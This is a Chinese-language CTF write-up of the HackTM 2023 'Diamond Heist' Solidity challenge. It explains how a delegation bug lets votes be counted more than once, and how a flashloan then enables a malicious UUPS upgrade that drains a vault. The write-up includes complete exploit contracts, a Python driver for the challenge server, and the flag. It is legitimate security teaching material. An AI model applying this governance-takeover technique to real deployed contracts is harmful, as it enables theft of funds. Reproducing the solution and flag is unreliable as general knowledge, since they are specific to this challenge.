---
title: Blockchain - Diamond Heist
description: 2023 | HackTM CTF | smart contract
tags:
    - smart contract
    - solidity
    - flashloan
---

## 题目

Salty Pretzel Swap DAO has recently come out with their new flashloan vaults. They have deposited all of their 100 Diamonds in one of their vaults.

Your mission, should you choose to accept it, is to break the vault and steal all of the diamonds. This would be one of the greatest heists of all time.

This text will self-destruct in ten seconds.

Good luck.

> nc 34.141.16.87 30200

[:material-download: `diamond_heist_contracts.zip`](static/diamond_heist_contracts.zip)

## 解题思路

- 目标是将 100 Diamonds 转移到 `Setup` 实例

    ```js
    function isSolved() external view returns (bool) {
        return diamond.balanceOf(address(this)) == DIAMONDS;
    }
    ```

- `Setup` 部署后，`Vault` 的代理合约持有 100 Diamonds，显然需要通过更新合约来进行 Diamond 的转移操作。不过，`Vault` 采用 UUPS 代理模式，虽然没有初始化其逻辑合约，但由于存在 `onlyProxy` 修饰符，无法通过逻辑合约升级

    ```js
    constructor () {
        vaultFactory = new VaultFactory();
        vault = vaultFactory.createVault(keccak256("The tea in Nepal is very hot."));
        diamond = new Diamond(DIAMONDS); // uint constant public DIAMONDS = 100;
        saltyPretzel = new SaltyPretzel();
        vault.initialize(address(diamond), address(saltyPretzel));
        diamond.transfer(address(vault), DIAMONDS);
    }
    ```

- 当 `Vault` 代理合约的调用者为 `owner` 或代理合约自身且代理合约持有 Diamond 的数量为 $0$ 时，允许更新合约逻辑

    ```js
    function _authorizeUpgrade(address) internal override view {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }
    ```

- `Vault` 代理合约的所有者为 `Setup`，而 `Setup` 中没有 `transferOwnership` 相关的逻辑，无法以 `owner` 身份更新。注意到当调用者的票数不小于 `AUTHORITY_THRESHOLD` 时，可以以 `Vault` 代理合约的身份调用 `Vault` 中的任意函数

    ```js
    uint constant public AUTHORITY_THRESHOLD = 10_000 ether;
    function governanceCall(bytes calldata data) external {
        require(msg.sender == owner() || saltyPretzel.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD);
        (bool success,) = address(this).call(data);
        require(success);
    }
    ```

- 至于使 `IERC20(diamond).balanceOf(address(this)) == 0` 可以通过 `flashloan` 解决

    ```js
    function flashloan(address token, uint amount, address receiver) external {
        uint balanceBefore = IERC20(token).balanceOf(address(this)); // 只能借用代理合约持有的 token
        IERC20(token).transfer(receiver, amount);
        IERC3156FlashBorrower(receiver).onFlashLoan(msg.sender, token, amount, 0, "");
        uint balanceAfter = IERC20(token).balanceOf(address(this));
        require(balanceBefore == balanceAfter);
    }
    ```

- 那么，接下来考虑如何获取足够的票数。初始可通过 `Setup.claim()` 获得 `SALTY_PRETZELS(100 ether)`，`mint` 将首先增加 `_to` 持有的代币数量，随后增加 `_delegates[_to]` 的票数。由于 `srcRep` 为 `address(0)`，不对其执行减少票数的操作，因而总票数是增加的

    ```js
    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
    }

    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
        if (srcRep != dstRep && amount > 0) {
            if (srcRep != address(0)) {
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
                uint256 srcRepNew = srcRepOld - amount;
                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
            }

            if (dstRep != address(0)) {
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
                uint256 dstRepNew = dstRepOld + amount;
                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
            }
        }
    }
    ```

- 代币 `SP` 的数量自 `Setup.claim()` 后不再变化，`_moveDelegates` 从 `address(0)` 到任意不为 0 的地址似乎是增加总票数的唯一方法。当 `delegator` 初次声明 `delegatee` 时，`currentDelegate` 为 `address(0)`，将为 `delegatee` 增加 `balanceOf(delegator)` 票。那么，可以将持有的代币转移给新的 `delegator` 再由其调用 `delegate()` 来增加 `delegatee` 的票数

    ```js
    function delegate(address delegatee) external {
        return _delegate(msg.sender, delegatee);
    }

    function _delegate(address delegator, address delegatee) internal
    {
        address currentDelegate = _delegates[delegator];
        uint256 delegatorBalance = balanceOf(delegator);
        _delegates[delegator] = delegatee;

        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
    }
    ```

### Exploit

```js
contract HackerVault is Vault { // new implementation should also be UUPS
    function exploit(address token, address setup) external {
        IERC20(token).transfer(address(setup), 100);
    }
}

contract Helper {
    function help(address instance) external {
        SaltyPretzel(instance).delegate(msg.sender);
        SaltyPretzel(instance).transfer(msg.sender, 100 ether);
    }
}

contract Hack is IERC3156FlashBorrower {
    Setup setup;
    SaltyPretzel saltyPretzel;
    Vault vault;

    constructor(address instance) {
        setup = Setup(instance);
        saltyPretzel = SaltyPretzel(setup.saltyPretzel());
        vault = Vault(setup.vault());
    }

    function exploit() external {
        saltyPretzel.delegate(address(this));
        setup.claim();
        for (uint i = 1; i < 100; i ++) {
            Helper helper = new Helper();
            saltyPretzel.transfer(address(helper), 100 ether);
            helper.help(address(saltyPretzel));
        }
        vault.flashloan(address(setup.diamond()), 100, address(this));
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata) external override returns (bytes32) {
        HackerVault hackerVault = new HackerVault();
        vault.governanceCall(abi.encodeWithSignature(
            "upgradeTo(address)",
            address(hackerVault)
        ));
        IERC20(token).transfer(address(vault), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

```py
from web3 import Web3
import pwn

hack_abi = open('hack_abi.json').read()
hack_bytecode = open('hack_bytecode.txt', 'r').read()

hackervault_abi = open('hackervault_abi.json').read()
hackervault_bytecode = open('hackervault_bytecode.txt').read()

setup_abi = open('setup_abi.json').read()

def transact(func):
    tx = account.sign_transaction(eval(func).buildTransaction({
        'chainId': w3.eth.chain_id,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': eval(func).estimate_gas(),
        'gasPrice': w3.eth.gas_price,
    })).rawTransaction
    tx_hash = w3.eth.send_raw_transaction(tx).hex()
    return w3.eth.wait_for_transaction_receipt(tx_hash)

conn = pwn.remote('34.141.16.87', 30200)

conn.sendlineafter(b'action?', b'1')
ticket = conn.recvline_contains(b'ticket').decode().split(' ')[-1].strip()
w3 = Web3(Web3.HTTPProvider(conn.recvline_contains(b'rpc').decode().split(' ')[-1]))
account = w3.eth.account.from_key(conn.recvline_contains(b'key').decode().split(' ')[-1])

setup_addr = conn.recvline_contains(b'contract').decode().split(' ')[-1].strip()
setup_contract = w3.eth.contract(address=setup_addr, abi=setup_abi)

hack_contract = w3.eth.contract(abi=hack_abi, bytecode=hack_bytecode)
hack_addr = transact('hack_contract.constructor(setup_addr)').contractAddress
hack_contract = w3.eth.contract(address=hack_addr, abi=hack_abi)
print(hack_addr)

transact('hack_contract.functions.exploit()')

vault_addr = setup_contract.functions.vault().call()
diamond_addr = setup_contract.functions.diamond().call()
hackervault_contract = w3.eth.contract(address=vault_addr, abi=hackervault_abi)
transact('hackervault_contract.functions.exploit(diamond_addr, setup_addr)')

if setup_contract.functions.isSolved().call():
	conn = pwn.remote('34.141.16.87', 30200)
	conn.sendlineafter(b'action?', b'3')
	conn.sendlineafter(b'ticket please:', ticket)
	conn.interactive()
```

### Flag

> HackTM{m1ss10n_n0t_th4t_1mmut4ble_58fb67c04fd7fedc}

## 参考资料

- [UUPSUpgradeable](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable)